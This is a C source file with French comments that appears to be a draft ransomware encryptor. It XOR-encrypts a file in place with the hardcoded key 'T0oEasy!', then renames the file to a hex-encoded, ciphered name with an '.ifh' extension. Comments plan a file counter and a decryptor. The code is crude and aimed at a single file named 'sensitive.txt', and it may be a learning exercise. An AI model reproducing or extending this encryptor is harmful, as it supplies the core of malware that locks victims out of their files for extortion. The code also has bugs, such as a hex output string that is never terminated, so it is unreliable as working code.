#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>


void string2hexString(char* input, char* output)
{
    // OK
    int loop;
    int i;

    i = 0;
    loop = 0;

    while (i < strlen(input) * 2) { // Mystique, à démystifier
        sprintf((char*)(output + i), "%02X", input[loop]);
        loop += 1;
        i += 2;
    }
    //insert NULL at the end of the output string
    //output[i++] = '\0';
}

void xorDefaultFile(const char *filename, const char *key) { 
    // OK

    // voir pour passer la fonction en int pour return 1 pour compter le nb fichiers chiffrés
    
    // Xor a file into an other one and delete the input file
    FILE *inFile;
    unsigned char ch;


    int keyLength = strlen(key);
    int keyIndex = 0;
    //char* xored_filename = (char*)malloc(strlen(filename) + 1);

    // Open the input file in binary read mode
    inFile = fopen(filename, "rb+");

    if (inFile == NULL) {
        perror("Error opening input file");
        return;
    }

    // Read from the file byte by byte, XOR it with the key, and write back to the same location
    while (fread(&ch, 1, 1, inFile) == 1) {
        ch ^= key[keyIndex];
        keyIndex = (keyIndex + 1) % keyLength; // Move cyclically through the key
        fseek(inFile, -1, SEEK_CUR); // Move the file pointer one byte back from the current position
        fwrite(&ch, 1, 1, inFile);   // Write the XORed byte to the same location
        fseek(inFile, 0, SEEK_CUR);  // Move the file pointer back to the current position
    }
    /*
    fseek(inFile, 0, SEEK_END); // Move file pointer to the end of the file
    for (size_t i = 0; i < strlen(filename); i++) {
        xored_filename[i] = filename[i] ^ key[keyIndex];
        keyIndex = (keyIndex + 1) % keyLength;
    }
    fwrite(xored_filename, 1, strlen(xored_filename), inFile);
    // Faire le decryptor pour renommer le fichier
    */


    // Close the files
    fclose(inFile);

    
}


void renameFile(const char* filename, const char *key){
    // OK

    int keyLength = strlen(key);
    int keyIndex = 0;
    const char* ext = ".ifh";

    char* input = (char*)malloc(strlen(filename) + 1);
    strcpy(input, filename);
    char hex_str[(strlen(input) * 2) + 1];

    for (size_t i = 0; i < strlen(filename); i++)
    {
        input[i] =filename[i] ^ key[i % keyLength];
    }
    input[strlen(filename)] = '\0';

    string2hexString(input, hex_str);
    printf("Cipher hexa : %s\n", hex_str);


	strncat(hex_str, ext, 4);
	printf("Name : %s\n", hex_str);

    printf("DEBUG : old filename %s\n", filename);
    printf("DEBUG : new filename %s\n", hex_str);

    int ret = rename(filename, hex_str);

    if (ret == 0){
        printf("Renamed\n");
    }
    else {
      printf("Error: unable to rename the file\n");
   }
   free(input);

}

const char* getKey() {
    // return encryption key for the moment
  return "T0oEasy!";
}





int main(void)
{
    const char *File = "sensitive.txt";   // Replace with the name of your input file
    // extension to change in .dop
    // encrypt the original filename at the start of the file encrypted to recover it

    xorDefaultFile(File, getKey()); 
    renameFile(File, getKey());
    printf("DONE");

    return 0;
}